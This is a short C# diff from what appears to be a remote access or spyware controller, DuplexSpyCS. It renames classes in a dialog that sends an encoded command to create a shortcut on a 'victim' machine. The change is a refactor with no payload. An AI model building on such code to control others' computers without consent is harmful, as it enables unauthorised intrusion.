@@ -12,11 +12,11 @@ namespace DuplexSpyCS
 {
     public partial class frmFileShortCut : Form
     {
-        private Victim v;
+        private clsVictim v;
         private string m_szCurrentDir;
         private string m_szFilePath;
 
-        public frmFileShortCut(Victim v, string szCurrentDir, string szFilePath)
+        public frmFileShortCut(clsVictim v, string szCurrentDir, string szFilePath)
         {
             InitializeComponent();
 
@@ -50,7 +50,7 @@ namespace DuplexSpyCS
             else if (radioButton1.Checked)
                 szType = "url";
 
-            v.SendCommand($"file|sc|{szType}|{string.Join("|", new string[] {textBox1.Text, textBox2.Text, textBox3.Text}.Select(x => Crypto.b64E2Str(x)))}");
+            v.SendCommand($"file|sc|{szType}|{string.Join("|", new string[] {textBox1.Text, textBox2.Text, textBox3.Text}.Select(x => clsCrypto.b64E2Str(x)))}");
         }
     }
 }
